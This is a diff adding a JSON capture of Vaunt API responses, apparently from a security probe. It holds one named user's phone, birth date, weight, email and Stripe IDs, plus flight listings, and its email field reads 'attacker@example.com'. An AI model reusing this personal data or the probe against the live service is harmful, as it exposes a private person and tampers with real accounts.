@@ -1,0 +1,4375 @@
+{
+  "timestamp": "2025-11-05T17:27:14.065204",
+  "api_host": "https://vauntapi.flyvaunt.com",
+  "baseline": {
+    "User Profile": {
+      "sweepstakesEntries": [],
+      "createdAt": 1710825847458,
+      "updatedAt": 1762363555375,
+      "id": 20254,
+      "phoneNumber": "+13035234453",
+      "email": "attacker@example.com",
+      "confirmedEmail": "sameer.s.chopra@gmail.com",
+      "priorityScore": 1931577847,
+      "firstName": "Sameer",
+      "middleName": "",
+      "lastName": "Chopra",
+      "dateOfBirth": "1991-08-14",
+      "weight": 140,
+      "gender": "Male",
+      "isCarbonOffsetEnrolled": true,
+      "successfulReferralCount": 0,
+      "lastFlightPurchase": null,
+      "eulaVersion": null,
+      "isEulaAccepted": false,
+      "hasStripePaymentDetails": false,
+      "stripeCustomerId": "cus_PlS5D89fzdDYgF",
+      "stripeSubscriptionId": null,
+      "stripeSubscriptionPaymentIntentId": null,
+      "stripeFlightPurchasePaymentIntentId": null,
+      "subscriptionStartDate": 1760700980000,
+      "subscriptionRenewalDate": 1830297600000,
+      "lastActivityAt": 1762307406434,
+      "referralKey": "nBBMuS",
+      "smsOptIn": true,
+      "emailOptIn": true,
+      "trackingOptIn": false,
+      "isFlightNotificationEnabled": true,
+      "isAllFlightsNotificationEnabled": true,
+      "androidAppVersion": "1.1.40",
+      "androidBuildNumber": 183,
+      "iosAppVersion": "1.1.40",
+      "iosBuildNumber": 219,
+      "abandonedRegReminderSent": false,
+      "license": {
+        "createdAt": 1760700980000,
+        "updatedAt": 1760746044256,
+        "id": 3050,
+        "uuid": "b7d49fc6-cd3e-4560-b100-08edf4d3b922",
+        "expiresAt": 1830297600000,
+        "isAssigned": true,
+        "stripeSubscriptionId": null,
+        "preferredStripeCreationDate": 1798761600000,
+        "membershipTier": {
+          "id": 2,
+          "name": "cabin+",
+          "priorityLevel": 2
+        },
+        "account": null,
+        "user": 20254,
+        "licenseRefund": null
+      },
+      "account": null,
+      "subscriptionStatus": 3,
+      "waitlistUpgrades": [
+        {
+          "createdAt": 1711138021682,
+          "updatedAt": 1713541686134,
+          "id": 456,
+          "costToUse": 149500,
+          "customAmount": null,
+          "stripePaymentIntentId": null,
+          "usedOn": null,
+          "priorityUpgradeTier": {
+            "id": 1,
+            "name": "base",
+            "priorityLevel": 1,
+            "stripePriceId": "price_1QDDF5BkrWmvysmujrEHAbSh"
+          },
+          "user": 20254,
+          "expiresOn": -1
+        },
+        {
+          "createdAt": 1711138021682,
+          "updatedAt": 1746829193471,
+          "id": 896,
+          "costToUse": 0,
+          "customAmount": null,
+          "stripePaymentIntentId": "in_1RMzGkBkrWmvysmuux7aAe55",
+          "usedOn": null,
+          "priorityUpgradeTier": {
+            "id": 2,
+            "name": "base_free",
+            "priorityLevel": 1,
+            "stripePriceId": null
+          },
+          "user": 20254,
+          "expiresOn": -1
+        },
+        {
+          "createdAt": 1742705161901,
+          "updatedAt": 1742705161902,
+          "id": 5484,
+          "costToUse": 149500,
+          "customAmount": null,
+          "stripePaymentIntentId": null,
+          "usedOn": null,
+          "priorityUpgradeTier": {
+            "id": 1,
+            "name": "base",
+            "priorityLevel": 1,
+            "stripePriceId": "price_1QDDF5BkrWmvysmujrEHAbSh"
+          },
+          "user": 20254,
+          "expiresOn": -1
+        },
+        {
+          "createdAt": 1746886000226,
+          "updatedAt": 1746886000226,
+          "id": 5978,
+          "costToUse": 0,
+          "customAmount": null,
+          "stripePaymentIntentId": null,
+          "usedOn": null,
+          "priorityUpgradeTier": {
+            "id": 2,
+            "name": "base_free",
+            "priorityLevel": 1,
+            "stripePriceId": null
+          },
+          "user": 20254,
+          "expiresOn": -1
+        },
+        {
+          "createdAt": 1761856740189,
+          "updatedAt": 1761864095757,
+          "id": 7756,
+          "costToUse": 0,
+          "customAmount": null,
+          "stripePaymentIntentId": "in_1SO2csBkrWmvysmuy0WfLjp3",
+          "usedOn": 1761864095757,
+          "priorityUpgradeTier": {
+            "id": 4,
+            "name": "cabin+_free",
+            "priorityLevel": 2,
+            "stripePriceId": null
+          },
+          "user": 20254,
+          "expiresOn": -1
+        }
+      ],
+      "termsStatus": {
+        "TermsAndConditions": {
+          "requiresAcceptance": false,
+          "currentVersion": "1.1",
+          "lastAcceptedVersion": "1.1",
+          "lastAcceptedDate": 1756848451030
+        },
+        "PrivacyPolicy": {
+          "requiresAcceptance": false,
+          "currentVersion": "1.1",
+          "lastAcceptedVersion": "1.1",
+          "lastAcceptedDate": 1756848451047
+        }
+      }
+    },
+    "Subscription": {
+      "pk": "pk_live_51Is7UdBkrWmvysmuX4hyzaPiAKfXxkFvYabmpKe6igGDXdUjT9nL4bJRyS4ngfKw6SwqpmEoxrP3vU8GwBBHkwMr00GkDgedAF"
+    },
+    "Payment Method": {
+      "hasPaymentMethod": false,
+      "cards": []
+    },
+    "Flight History": {
+      "data": [
+        {
+          "id": 8796,
+          "uuid": "ee28b4f5-974d-4a44-b103-cd8ebd21a477",
+          "departDateTime": "2025-11-05T16:24:00.000Z",
+          "departDateTimeLocal": "2025-11-05T10:24",
+          "deletedAt": null,
+          "updatedAt": 1762300715760,
+          "closeoutDateTime": "2025-11-04T23:00:00.000Z",
+          "bannerUrl": "https://volatostorage.blob.core.windows.net/cities/e46a77c5-f885-4a12-8253-4562a9fad441.png",
+          "isConfirmedByWinner": true,
+          "status": 2,
+          "numberOfEntrants": 3,
+          "tierClassification": "cabin+",
+          "winner": 136548,
+          "aircraft": {
+            "id": 145,
+            "tail": "N391JS",
+            "type": 13
+          },
+          "departAirport": {
+            "id": 32,
+            "name": "Nashville International Airport",
+            "codeIcao": "KBNA",
+            "codeIata": "BNA",
+            "latitude": 36.12450027,
+            "longitude": -86.67819977,
+            "addressLine1": null,
+            "addressLine2": null,
+            "city": "Nashville",
+            "provinceCode": "TN",
+            "postalCode": null,
+            "countryCode": "US",
+            "website": null,
+            "code": "KBNA",
+            "codeFaa": null
+          },
+          "arriveAirport": {
+            "id": 273,
+            "name": "Dupage Airport",
+            "codeIcao": "KDPA",
+            "codeIata": "DPA",
+            "latitude": 41.90779877,
+            "longitude": -88.24859619,
+            "addressLine1": null,
+            "addressLine2": null,
+            "city": "Chicago/West Chicago",
+            "provinceCode": "IL",
+            "postalCode": null,
+            "countryCode": "US",
+            "website": "http://www.dupageairport.com/",
+            "code": "KDPA",
+            "codeFaa": null
+          },
+          "departFbo": {
+            "id": 753,
+            "name": "SIGNATURE FLIGHT SUPPORT",
+            "uuid": "78106677-ee44-4d27-b261-c9891713e81a",
+            "phoneNumber": "615 361 3000",
+            "emailAddress": "bna@signatureflight.com",
+            "website": null,
+            "addressLine1": "767 Hangar Lane Nashville, TN 37217",
+            "addressLine2": null,
+            "city": "NASHVILLE",
+            "province": "TN",
+            "postalCode": null,
+            "countryCode": "US",
+            "airport": null
+          },
+          "arriveFbo": {
+            "id": 547,
+            "name": "DUPAGE FLIGHT CENTER",
+            "uuid": "c9c7685b-f001-11ed-82b1-1e8adba15a41",
+            "phoneNumber": "630-208-5600",
+            "emailAddress": "dfcfuel@dupageairport.com",
+            "website": "http://www.dupageflightcenter.com/",
+            "addressLine1": "2700 INTERNATIONAL DR",
+            "addressLine2": null,
+            "city": "CHICAGO",
+            "province": "Illinois",
+            "postalCode": null,
+            "countryCode": "US",
+            "airport": null
+          },
+          "arriveDateTime": "2025-11-05T18:54:00.000Z",
+          "userData": {
+            "action": "NO_ACTION"
+          }
+        },
+        {
+          "id": 8804,
+          "uuid": "bbaa691d-156c-40d8-bf76-6f64d271a56e",
+          "departDateTime": "2025-11-05T16:12:00.000Z",
+          "departDateTimeLocal": "2025-11-05T11:12",
+          "deletedAt": null,
+          "updatedAt": 1762360226940,
+          "closeoutDateTime": "2025-11-04T23:40:00.000Z",
+          "bannerUrl": "https://volatostorage.blob.core.windows.net/cities/aeda094e-af0f-49c5-b36a-b9b0602f9bc4.png",
+          "isConfirmedByWinner": true,
+          "status": 2,
+          "numberOfEntrants": 2,
+          "tierClassification": "cabin+",
+          "winner": 114594,
+          "aircraft": {
+            "id": 107,
+            "tail": "N461MC",
+            "type": 15
+          },
+          "departAirport": {
+            "id": 123,
+            "name": "Fort Lauderdale Executive Airport",
+            "codeIcao": "KFXE",
+            "codeIata": "FXE",
+            "latitude": 26.19729996,
+            "longitude": -80.17070007,
+            "addressLine1": null,
+            "addressLine2": null,
+            "city": "Fort Lauderdale",
+            "provinceCode": "FL",
+            "postalCode": null,
+            "countryCode": "US",
+            "website": "http://www.fortlauderdale.gov/fxE/index.htm",
+            "code": "KFXE",
+            "codeFaa": null
+          },
+          "arriveAirport": {
+            "id": 837,
+            "name": "Boca Raton Airport",
+            "codeIcao": "KBCT",
+            "codeIata": "BCT",
+            "latitude": 26.37849998,
+            "longitude": -80.10769653,
+            "addressLine1": null,
+            "addressLine2": null,
+            "city": "Boca Raton",
+            "provinceCode": "FL",
+            "postalCode": null,
+            "countryCode": "US",
+            "website": null,
+            "code": "KBCT",
+            "codeFaa": null
+          },
+          "departFbo": {
+            "id": 219,
+            "name": "ATLANTIC AVIATION",
+            "uuid": "c9c79b69-f001-11ed-82b1-1e8adba15a41",
+            "phoneNumber": "954-772-7444",
+            "emailAddress": "",
+            "website": "",
+            "addressLine1": "1020 NW 62nd St",
+            "addressLine2": null,
+            "city": "Fort Lauderdale",
+            "province": "Florida",
+            "postalCode": null,
+            "countryCode": "US",
+            "airport": null
+          },
+          "arriveFbo": {
+            "id": 55,
+            "name": "ATLANTIC AVIATION",
+            "uuid": "c9c72ede-f001-11ed-82b1-1e8adba15a41",
+            "phoneNumber": "561-368-1110",
+            "emailAddress": "bctfrontdesk@atlanticaviation.com",
+            "website": "http://www.atlanticaviation.com/location/bct",
+            "addressLine1": "3700 AIRPORT RD",
+            "addressLine2": null,
+            "city": "BOCA RATON",
+            "province": "Florida",
+            "postalCode": null,
+            "countryCode": "US",
+            "airport": null
+          },
+          "arriveDateTime": "2025-11-05T18:42:00.000Z",
+          "userData": {
+            "action": "NO_ACTION"
+          }
+        },
+        {
+          "id": 8795,
+          "uuid": "ae2ddc55-7d2c-4db8-8a1f-208f1b606aa2",
+          "departDateTime": "2025-11-05T16:05:00.000Z",
+          "departDateTimeLocal": "2025-11-05T11:05",
+          "deletedAt": null,
+          "updatedAt": 1762360203142,
+          "closeoutDateTime": "2025-11-04T23:00:00.000Z",
+          "bannerUrl": "https://volatostorage.blob.core.windows.net/cities/207373ad-5179-4f3f-9f50-270ae9699bf1.png",
+          "isConfirmedByWinner": true,
+          "status": 2,
+          "numberOfEntrants": 7,
+          "tierClassification": "cabin+",
+          "winner": 26927,
+          "aircraft": {
+            "id": 144,
+            "tail": "N390JS",
+            "type": 13
+          },
+          "departAirport": {
+            "id": 31,
+            "name": "Tampa International Airport",
+            "codeIcao": "KTPA",
+            "codeIata": "TPA",
+            "latitude": 27.97550011,
+            "longitude": -82.53320313,
+            "addressLine1": null,
+            "addressLine2": null,
+            "city": "Tampa",
+            "provinceCode": "FL",
+            "postalCode": null,
+            "countryCode": "US",
+            "website": null,
+            "code": "KTPA",
+            "codeFaa": null
+          },
+          "arriveAirport": {
+            "id": 128,
+            "name": "Kissimmee Gateway Airport",
+            "codeIcao": "KISM",
+            "codeIata": "ISM",
+            "latitude": 28.28980064,
+            "longitude": -81.43710327,
+            "addressLine1": null,
+            "addressLine2": null,
+            "city": "Orlando",
+            "provinceCode": "FL",
+            "postalCode": null,
+            "countryCode": "US",
+            "website": "http://www.kissimmee.org/index.aspx?page=111",
+            "code": "KISM",
+            "codeFaa": null
+          },
+          "departFbo": {
+            "id": 751,
+            "name": "Signature - TPA",
+            "uuid": "f884c6c8-bebf-4a2e-a365-d8c8b64f3fb2",
+            "phoneNumber": "813 870 3813",
+            "emailAddress": "TPA@signatureflight.com",
+            "website": null,
+            "addressLine1": "2450 N Westshore Blvd Tampa, FL 33607",
+            "addressLine2": null,
+            "city": "TAMPA",
+            "province": "FL",
+            "postalCode": null,
+            "countryCode": "US",
+            "airport": null
+          },
+          "arriveFbo": {
+            "id": 752,
+            "name": "SIGNATURE FLIGHT SUPPORT",
+            "uuid": "a0b15d2d-c57c-4ad8-ba0a-a4ee236ec68e",
+            "phoneNumber": "407 846 6128",
+            "emailAddress": "ism@signatureflight.com",
+            "website": null,
+            "addressLine1": "201 Dyer Blvd Kissimmee, FL 34741",
+            "addressLine2": null,
+            "city": "ORLANDO",
+            "province": "FL",
+            "postalCode": null,
+            "countryCode": "US",
+            "airport": null
+          },
+          "arriveDateTime": "2025-11-05T18:35:00.000Z",
+          "userData": {
+            "action": "NO_ACTION"
+          }
+        },
+        {
+          "id": 8803,
+          "uuid": "948cd323-6e21-4a09-8e26-a9ad63b8f0fe",
+          "departDateTime": "2025-11-05T14:15:00.000Z",
+          "departDateTimeLocal": "2025-11-05T09:15",
+          "deletedAt": null,
+          "updatedAt": 1762354798742,
+          "closeoutDateTime": "2025-11-04T23:40:00.000Z",
+          "bannerUrl": "https://volatostorage.blob.core.windows.net/cities/345e4c45-39ed-40ec-9e92-48597a45ff77.png",
+          "isConfirmedByWinner": true,
+          "status": 2,
+          "numberOfEntrants": 1,
+          "tierClassification": "cabin+",
+          "winner": 111610,
+          "aircraft": {
+            "id": 119,
+            "tail": "N198HB",
+            "type": 15
+          },
+          "departAirport": {
+            "id": 807,
+            "name": "Witham Field",
+            "codeIcao": "KSUA",
+            "codeIata": "SUA",
+            "latitude": 27.18169975,
+            "longitude": -80.22109985,
+            "addressLine1": null,
+            "addressLine2": null,
+            "city": "Stuart",
+            "provinceCode": "FL",
+            "postalCode": null,
+            "countryCode": "US",
+            "website": "http://ap3server.martin.fl.us/portal/page?_pageid=413,234422&_dad=portal&_schema=PORTAL",
+            "code": "KSUA",
+            "codeFaa": null
+          },
+          "arriveAirport": {
+            "id": 110,
+            "name": "St. Petersburg Clearwater International Airport",
+            "codeIcao": "KPIE",
+            "codeIata": "PIE",
+            "latitude": 27.9102,
+            "longitude": -82.687401,
+            "addressLine1": null,
+            "addressLine2": null,
+            "city": "Pinellas Park",
+            "provinceCode": "FL",
+            "postalCode": null,
+            "countryCode": "US",
+            "website": null,
+            "code": "KPIE",
+            "codeFaa": null
+          },
+          "departFbo": {
+            "id": 524,
+            "name": "ATLANTIC AVIATION",
+            "uuid": "c9c6dc15-f001-11ed-82b1-1e8adba15a41",
+            "phoneNumber": "772-288-6700",
+            "emailAddress": "suafrontdesk@atlanticaviation.com",
+            "website": "http://www.atlanticaviation.com",
+            "addressLine1": "2501 SE AVIATION WAY",
+            "addressLine2": null,
+            "city": "STUART",
+            "province": "Florida",
+            "postalCode": null,
+            "countryCode": "US",
+            "airport": null
+          },
+          "arriveFbo": {
+            "id": 74,
+            "name": "SHELTAIR AVIATION SERVICES",
+            "uuid": "c9c78b1d-f001-11ed-82b1-1e8adba15a41",
+            "phoneNumber": "727-530-3453",
+            "emailAddress": "info-pie@sheltairaviation.com",
+            "website": "https://sheltairaviation.com/fbos/pie-clearwater-fl/",
+            "addressLine1": "15875 FAIRCHILD DRIVE",
+            "addressLine2": null,
+            "city": "CLEARWATER",
+            "province": "Florida",
+            "postalCode": null,
+            "countryCode": "US",
+            "airport": null
+          },
+          "arriveDateTime": "2025-11-05T16:45:00.000Z",
+          "userData": {
+            "action": "NO_ACTION"
+          }
+        },
+        {
+          "id": 8802,
+          "uuid": "4fa5bc71-6119-4f37-8cc8-177b6eeeb56b",
+          "departDateTime": "2025-11-05T12:36:00.000Z",
+          "departDateTimeLocal": "2025-11-05T07:36",
+          "deletedAt": null,
+          "updatedAt": 1762351494936,
+          "closeoutDateTime": "2025-11-04T23:40:00.000Z",
+          "bannerUrl": "https://volatostorage.blob.core.windows.net/cities/e09622a6-ce7c-4a7c-b96b-81c811bbb70d.png",
+          "isConfirmedByWinner": true,
+          "status": 2,
+          "numberOfEntrants": 4,
+          "tierClassification": "cabin+",
+          "winner": 93101,
+          "aircraft": {
+            "id": 116,
+            "tail": "N317MP",
+            "type": 15
+          },
+          "departAirport": {
+            "id": 61,
+            "name": "Orlando Sanford International Airport",
+            "codeIcao": "KSFB",
+            "codeIata": "SFB",
+            "latitude": 28.77759933,
+            "longitude": -81.23750305,
+            "addressLine1": null,
+            "addressLine2": null,
+            "city": "Orlando",
+            "provinceCode": "FL",
+            "postalCode": null,
+            "countryCode": "US",
+            "website": null,
+            "code": "KSFB",
+            "codeFaa": null
+          },
+          "arriveAirport": {
+            "id": 103,
+            "name": "Piedmont Triad International Airport",
+            "codeIcao": "KGSO",
+            "codeIata": "GSO",
+            "latitude": 36.097801,
+            "longitude": -79.937302,
+            "addressLine1": null,
+            "addressLine2": null,
+            "city": "Greensboro",
+            "provinceCode": "NC",
+            "postalCode": null,
+            "countryCode": "US",
+            "website": null,
+            "code": "KGSO",
+            "codeFaa": null
+          },
+          "departFbo": {
+            "id": 142,
+            "name": "MILLION AIR",
+            "uuid": "c9c975c7-f001-11ed-82b1-1e8adba15a41",
+            "phoneNumber": "407-585-6300",
+            "emailAddress": "info.sfb@millionair.com",
+            "website": "http://www.millionair.com/sfb.aspx",
+            "addressLine1": "2841 FLIGHT LINE AVE",
+            "addressLine2": null,
+            "city": "SANFORD",
+            "province": "Florida",
+            "postalCode": null,
+            "countryCode": "US",
+            "airport": null
+          },
+          "arriveFbo": {
+            "id": 64,
+            "name": "KOURY AVIATION",
+            "uuid": "c9c69b87-f001-11ed-82b1-1e8adba15a41",
+            "phoneNumber": "336-279-7996",
+            "emailAddress": "frontdesk@kouryaviation.com",
+            "website": "http://www.kouryprivatejetcharter.com",
+            "addressLine1": "7680 AIRLINE ROAD",
+            "addressLine2": null,
+            "city": "GREENSBORO",
+            "province": "North Carolina",
+            "postalCode": null,
+            "countryCode": "US",
+            "airport": null
+          },
+          "arriveDateTime": "2025-11-05T15:06:00.000Z",
+          "userData": {
+            "action": "NO_ACTION"
+          }
+        },
+        {
+          "id": 8801,
+          "uuid": "547b9f77-d803-4bf1-ace7-fcc267c88fe4",
+          "departDateTime": "2025-11-05T12:15:00.000Z",
+          "departDateTimeLocal": "2025-11-05T07:15",
+          "deletedAt": null,
+          "updatedAt": 1762299776451,
+          "closeoutDateTime": "2025-11-04T23:40:00.000Z",
+          "bannerUrl": "https://volatostorage.blob.core.windows.net/cities/d5b4de7d-76de-4ba3-b41c-9860e73e0a5f.png",
+          "isConfirmedByWinner": false,
+          "status": 2,
+          "numberOfEntrants": 0,
+          "tierClassification": "cabin+",
+          "winner": null,
+          "aircraft": {
+            "id": 118,
+            "tail": "N975LV",
+            "type": 15
+          },
+          "departAirport": {
+            "id": 185,
+            "name": "Vero Beach Regional Airport",
+            "codeIcao": "KVRB",
+            "codeIata": "VRB",
+            "latitude": 27.6556,
+            "longitude": -80.417901,
+            "addressLine1": null,
+            "addressLine2": null,
+            "city": "Vero Beach",
+            "provinceCode": "FL",
+            "postalCode": null,
+            "countryCode": "US",
+            "website": "http://verobeachairport.org/",
+            "code": "KVRB",
+            "codeFaa": null
+          },
+          "arriveAirport": {
+            "id": 102,
+            "name": "Teterboro Airport",
+            "codeIcao": "KTEB",
+            "codeIata": "TEB",
+            "latitude": 40.85010147,
+            "longitude": -74.06079865,
+            "addressLine1": null,
+            "addressLine2": null,
+            "city": "Teterboro",
+            "provinceCode": "NJ",
+            "postalCode": null,
+            "countryCode": "US",
+            "website": "http://www.teb.com/",
+            "code": "KTEB",
+            "codeFaa": null
+          },
+          "departFbo": {
+            "id": 761,
+            "name": "CORPORATE AIR INC",
+            "uuid": "266278ce-2736-4463-9dac-712e23e3ff7d",
+            "phoneNumber": "772 562 1199",
+            "emailAddress": null,
+            "website": null,
+            "addressLine1": "3450B Airport West Dr Vero Beach, FL 32960",
+            "addressLine2": null,
+            "city": "VERO BEACH",
+            "province": "FL",
+            "postalCode": null,
+            "countryCode": "US",
+            "airport": null
+          },
+          "arriveFbo": {
+            "id": 60,
+            "name": "ATLANTIC AVIATION",
+            "uuid": "c9c6e647-f001-11ed-82b1-1e8adba15a41",
+            "phoneNumber": "201-288-1740",
+            "emailAddress": "tebfrontdesk@atlanticaviation.com",
+            "website": "http://www.atlanticaviation.com",
+            "addressLine1": "233 INDUSTRIAL AVENUE",
+            "addressLine2": null,
+            "city": "TETERBORO",
+            "province": "New Jersey",
+            "postalCode": null,
+            "countryCode": "US",
+            "airport": null
+          },
+          "arriveDateTime": "2025-11-05T14:45:00.000Z",
+          "userData": {
+            "action": "NO_ACTION"
+          }
+        },
+        {
+          "id": 8794,
+          "uuid": "a350f63d-0dfe-4611-95ac-79a042789986",
+          "departDateTime": "2025-11-04T19:49:00.000Z",
+          "departDateTimeLocal": "2025-11-04T11:49",
+          "deletedAt": null,
+          "updatedAt": 1762288431695,
+          "closeoutDateTime": "2025-11-03T22:20:00.000Z",
+          "bannerUrl": "https://volatostorage.blob.core.windows.net/cities/4e39eb8a-0442-4d07-bb85-909f2292e654.png",
+          "isConfirmedByWinner": true,
+          "status": 2,
+          "numberOfEntrants": 3,
+          "tierClassification": "cabin+",
+          "winner": 27,
+          "aircraft": {
+            "id": 63,
+            "tail": "N810JS",
+            "type": 14
+          },
+          "departAirport": {
+            "id": 95,
+            "name": "Santa Barbara Municipal Airport",
+            "codeIcao": "KSBA",
+            "codeIata": "SBA",
+            "latitude": 34.42620087,
+            "longitude": -119.8399963,
+            "addressLine1": null,
+            "addressLine2": null,
+            "city": "Santa Barbara",
+            "provinceCode": "CA",
+            "postalCode": null,
+            "countryCode": "US",
+            "website": null,
+            "code": "KSBA",
+            "codeFaa": null
+          },
+          "arriveAirport": {
+            "id": 26,
+            "name": "San Diego International Airport",
+            "codeIcao": "KSAN",
+            "codeIata": "SAN",
+            "latitude": 32.73360062,
+            "longitude": -117.1900024,
+            "addressLine1": null,
+            "addressLine2": null,
+            "city": "San Diego",
+            "provinceCode": "CA",
+            "postalCode": null,
+            "countryCode": "US",
+            "website": "http://www.san.org/",
+            "code": "KSAN",
+            "codeFaa": null
+          },
+          "departFbo": {
+            "id": 749,
+            "name": "SIGNATURE FLIGHT SUPPORT",
+            "uuid": "b4100a3d-64ec-4599-a697-427b04d47100",
+            "phoneNumber": "805 967 5608",
+            "emailAddress": null,
+            "website": null,
+            "addressLine1": "515 Marxmiller Place Santa Barbara, CA 93117",
+            "addressLine2": null,
+            "city": "SANTA BARBARA",
+            "province": "CA",
+            "postalCode": null,
+            "countryCode": "US",
+            "airport": null
+          },
+          "arriveFbo": {
+            "id": 750,
+            "name": "SIGNATURE FLIGHT SUPPORT",
+            "uuid": "7cdfa960-5558-4ea2-b592-b491d3343e4a",
+            "phoneNumber": "619 298 7704",
+            "emailAddress": "san@signatureflight.com",
+            "website": null,
+            "addressLine1": "3300 Admiral Boland Way San Diego, CA 92101",
+            "addressLine2": null,
+            "city": "SAN DIEGO",
+            "province": "CA",
+            "postalCode": null,
+            "countryCode": "US",
+            "airport": null
+          },
+          "arriveDateTime": "2025-11-04T22:19:00.000Z",
+          "userData": {
+            "action": "NO_ACTION"
+          }
+        },
+        {
+          "id": 8790,
+          "uuid": "27782f87-e9b6-4246-bb21-1de8b8d7d556",
+          "departDateTime": "2025-11-04T19:30:00.000Z",
+          "departDateTimeLocal": "2025-11-04T14:30",
+          "deletedAt": null,
+          "updatedAt": 1762210828794,
+          "closeoutDateTime": "2025-11-03T23:00:00.000Z",
+          "bannerUrl": "https://volatostorage.blob.core.windows.net/cities/b543a535-182f-4e36-a266-51d943ce214d.png",
+          "isConfirmedByWinner": false,
+          "status": 2,
+          "numberOfEntrants": 0,
+          "tierClassification": "cabin+",
+          "winner": null,
+          "aircraft": {
+            "id": 140,
+            "tail": "N765JS",
+            "type": 22
+          },
+          "departAirport": {
+            "id": 840,
+            "name": "Marco Island Executive Airport",
+            "codeIcao": "KMKY",
+            "codeIata": "MRK",
+            "latitude": 25.995001,
+            "longitude": -81.672501,
+            "addressLine1": null,
+            "addressLine2": null,
+            "city": "Marco Island",
+            "provinceCode": "FL",
+            "postalCode": null,
+            "countryCode": "US",
+            "website": "http://www.colliergov.net/index.aspx?page=21",
+            "code": "KMKY",
+            "codeFaa": null
+          },
+          "arriveAirport": {
+            "id": 811,
+            "name": "Destin Executive Airport",
+            "codeIcao": "KDTS",
+            "codeIata": "DSI",
+            "latitude": 30.40010071,
+            "longitude": -86.47149658,
+            "addressLine1": null,
+            "addressLine2": null,
+            "city": "Destin",
+            "provinceCode": "FL",
+            "postalCode": null,
+            "countryCode": "US",
+            "website": "http://www.flydts.com/",
+            "code": "KDTS",
+            "codeFaa": null
+          },
+          "departFbo": {
+            "id": 745,
+            "name": "MARCO ISLAND EXEC AIRPORT",
+            "uuid": "432f75f4-a8b1-4c3a-88cc-a164c36944d3",
+            "phoneNumber": "239 252 1059",
+            "emailAddress": "marcocustomerservice@colliergov.net",
+            "website": null,
+            "addressLine1": "2005 Mainsail Dr, Ste 1 Naples, FL 34114",
+            "addressLine2": null,
+            "city": "MARCO ISLAND",
+            "province": "FL",
+            "postalCode": null,
+            "countryCode": "US",
+            "airport": null
+          },
+          "arriveFbo": {
+            "id": 31,
+            "name": "ATLANTIC AVIATION",
+            "uuid": "c9c6a207-f001-11ed-82b1-1e8adba15a41",
+            "phoneNumber": "850-424-6890",
+            "emailAddress": "dtsfrontdesk@atlanticaviation.com",
+            "website": "http://www.atlanticaviation.com",
+            "addressLine1": "1001 AIRPORT ROAD",
+            "addressLine2": null,
+            "city": "DESTIN",
+            "province": "Florida",
+            "postalCode": null,
+            "countryCode": "US",
+            "airport": null
+          },
+          "arriveDateTime": "2025-11-04T22:00:00.000Z",
+          "userData": {
+            "action": "NO_ACTION"
+          }
+        },
+        {
+          "id": 8787,
+          "uuid": "f973b99a-e3e3-4cfc-886a-9fcfd80442e1",
+          "departDateTime": "2025-11-04T18:45:00.000Z",
+          "departDateTimeLocal": "2025-11-04T11:45",
+          "deletedAt": null,
+          "updatedAt": 1762217067660,
+          "closeoutDateTime": "2025-11-03T23:40:00.000Z",
+          "bannerUrl": "https://volatostorage.blob.core.windows.net/cities/cc499635-a972-42e7-a726-65d3d29f04b4.png",
+          "isConfirmedByWinner": false,
+          "status": 2,
+          "numberOfEntrants": 0,
+          "tierClassification": "cabin+",
+          "winner": null,
+          "aircraft": {
+            "id": 113,
+            "tail": "N924PS",
+            "type": 15
+          },
+          "departAirport": {
+            "id": 23,
+            "name": "Salt Lake City International Airport",
+            "codeIcao": "KSLC",
+            "codeIata": "SLC",
+            "latitude": 40.785749,
+            "longitude": -111.979746,
+            "addressLine1": null,
+            "addressLine2": null,
+            "city": "Salt Lake City",
+            "provinceCode": "UT",
+            "postalCode": null,
+            "countryCode": "US",
+            "website": null,
+            "code": "KSLC",
+            "codeFaa": null
+          },
+          "arriveAirport": {
+            "id": 217,
+            "name": "Casper-Natrona County International Airport",
+            "codeIcao": "KCPR",
+            "codeIata": "CPR",
+            "latitude": 42.908001,
+            "longitude": -106.463997,
+            "addressLine1": null,
+            "addressLine2": null,
+            "city": "Casper",
+            "provinceCode": "WY",
+            "postalCode": null,
+            "countryCode": "US",
+            "website": null,
+            "code": "KCPR",
+            "codeFaa": null
+          },
+          "departFbo": {
+            "id": 670,
+            "name": "ATLANTIC AVIATION",
+            "uuid": "c9c7b451-f001-11ed-82b1-1e8adba15a41",
+            "phoneNumber": "385-715-7192",
+            "emailAddress": "slcfrontdesk@atlanticaviation.com",
+            "website": "http://www.atlanticaviation.com/location/slc",
+            "addressLine1": "369 N 2370 WEST",
+            "addressLine2": null,
+            "city": "SALT LAKE CITY",
+            "province": "Utah",
+            "postalCode": null,
+            "countryCode": "US",
+            "airport": null
+          },
+          "arriveFbo": {
+            "id": 743,
+            "name": "ATLANTIC AVIATION",
+            "uuid": "c9ccfe81-f001-11ed-82b1-1e8adba15a41",
+            "phoneNumber": "307-472-3400",
+            "emailAddress": "cprfrontdesk@atlanticaviation.com",
+            "website": "http://www.atlanticaviation.com/locations/cpr",
+            "addressLine1": "7956 FULLER ST.",
+            "addressLine2": null,
+            "city": "CASPER",
+            "province": "Wyoming",
+            "postalCode": null,
+            "countryCode": "US",
+            "airport": null
+          },
+          "arriveDateTime": "2025-11-04T21:15:00.000Z",
+          "userData": {
+            "action": "NO_ACTION"
+          }
+        },
+        {
+          "id": 8792,
+          "uuid": "7c60b4b6-70a2-4968-b758-c5f549afd12e",
+          "departDateTime": "2025-11-04T17:46:00.000Z",
+          "departDateTimeLocal": "2025-11-04T12:46",
+          "deletedAt": null,
+          "updatedAt": 1762210828875,
+          "closeoutDateTime": "2025-11-03T23:00:00.000Z",
+          "bannerUrl": "https://volatostorage.blob.core.windows.net/cities/bbf1c90b-6e07-4b59-9830-320bbf601031.png",
+          "isConfirmedByWinner": false,
+          "status": 2,
+          "numberOfEntrants": 0,
+          "tierClassification": "cabin+",
+          "winner": null,
+          "aircraft": {
+            "id": 142,
+            "tail": "N768BL",
+            "type": 13
+          },
+          "departAirport": {
+            "id": 885,
+            "name": "Leesburg Executive Airport",
+            "codeIcao": "KJYO",
+            "codeIata": null,
+            "latitude": 39.077999,
+            "longitude": -77.557503,
+            "addressLine1": null,
+            "addressLine2": null,
+            "city": "Leesburg",
+            "provinceCode": "VA",
+            "postalCode": null,
+            "countryCode": "US",
+            "website": "http://www.leesburgva.gov/government/departments/airport",
+            "code": "KJYO",
+            "codeFaa": null
+          },
+          "arriveAirport": {
+            "id": 501,
+            "name": "Pitt Greenville Airport",
+            "codeIcao": "KPGV",
+            "codeIata": "PGV",
+            "latitude": 35.6352005,
+            "longitude": -77.38529968,
+            "addressLine1": null,
+            "addressLine2": null,
+            "city": "Greenville",
+            "provinceCode": "NC",
+            "postalCode": null,
+            "countryCode": "US",
